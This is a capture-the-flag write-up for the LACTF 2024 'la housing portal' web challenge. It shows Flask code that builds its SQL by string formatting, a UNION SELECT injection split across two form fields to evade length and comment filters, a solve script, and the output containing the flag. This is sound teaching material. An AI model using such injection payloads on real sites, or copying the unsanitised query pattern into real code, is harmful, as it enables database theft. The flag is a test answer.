---
title: la housing portal
date: 2024-02-19 08:02
tags: 
- web
- sqli
- author-hartmannsyg
categories: LACTF 2024
---

We see an SQL injection vulnerability here:

{% ccb caption:app.py gutter1:10-41 lang:py highlight:12,30 %}
@app.route("/submit", methods=["POST"])
def search_roommates():
    data = request.form.copy()

    if len(data) > 6:
        return "Invalid form data", 422
    
    
    for k, v in list(data.items()):
        if v == 'na':
            data.pop(k)
        if (len(k) > 10 or len(v) > 50) and k != "name":
            return "Invalid form data", 422
        if "--" in k or "--" in v or "/*" in k or "/*" in v:
            return render_template("hacker.html")
        
    name = data.pop("name")

    
    roommates = get_matching_roommates(data)
    return render_template("results.html", users = roommates, name=name)
    

def get_matching_roommates(prefs: dict[str, str]):
    if len(prefs) == 0:
        return []
    query = """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
    )
    print(query)
{% endccb %}

So we can try a UNION SELECT sql injection
{% ccb html:true %}
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> guests <span class="operator">=</span> <span class="string">'</span><span class='code-segment-highlight'><span class="string">'</span><span class="keyword">UNION</span> <span class="keyword">SELECT</span> "a",<span class="operator">*</span>,"a","a","a","a"<span class="keyword">FROM</span> flag <span class="keyword">WHERE</span> <span class="string">''</span><span class="operator">=</span><span class="string">'</span></span><span class="string">'</span> LIMIT <span class="number">25</span>;{% endccb %}

However, `'UNION SELECT "a",*,"a","a","a","a"FROM flag WHERE ''='` is too long (>50 chars)

(We need all the other "a"s to make sure that our other SELECT statement also has 6 columns (same as the user table) so that we can UNION it together with the user table)

So instead I got around this bypass but using two fields:

{% ccb html:true wrapped:true %}
<span class="keyword">where</span> guests <span class="operator">=</span> <span class="string">'</span><span class='code-segment-highlight'><span class="string">'</span><span class="keyword">UNION</span> <span class="keyword">SELECT</span> "a",<span class="operator">*</span>,"a","a","a","a"<span class="keyword">FROM</span> flag <span class="keyword">WHERE</span></span><span class="string">' AND neatness = '</span><span class='code-segment-highlight'><span class="operator">!=</span><span class="string">'</span></span><span class="string">'</span> LIMIT <span class="number">25</span>;
{% endccb %}

{% ccb caption:solve.py lang:py gutter1:1-10 %}
import requests

data = {
    "name": "A",
    "guests": """'UNION SELECT"a",*,"a","a","a","a"FROM flag WHERE""",
    "neatness": "!='"
}

res = requests.post('https://la-housing.chall.lac.tf/submit',data)
print(res.text)
{% endccb %}

We get

{% ccb lang:html highlight:15 terminal:true %}
<h2>Result for A:</h2>
<table id="data" class="table table-striped">
  <thead>
    <tr>
      <th>Name</th>
      <th>Guests</th>
      <th>Neatness</th>
      <th>Sleep time</th>
      <th>Awake time</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>lactf{us3_s4n1t1z3d_1npu7!!!}</td>
      <td>a</td>
      <td>a</td>
      <td>a</td>
      <td>a</td>
    </tr>

  </tbody>
</table>
<a href="/">Back</a>

<style>
  * {
    border: 1px solid black; border-collapse: collapse;
  }
</style>
{% endccb %}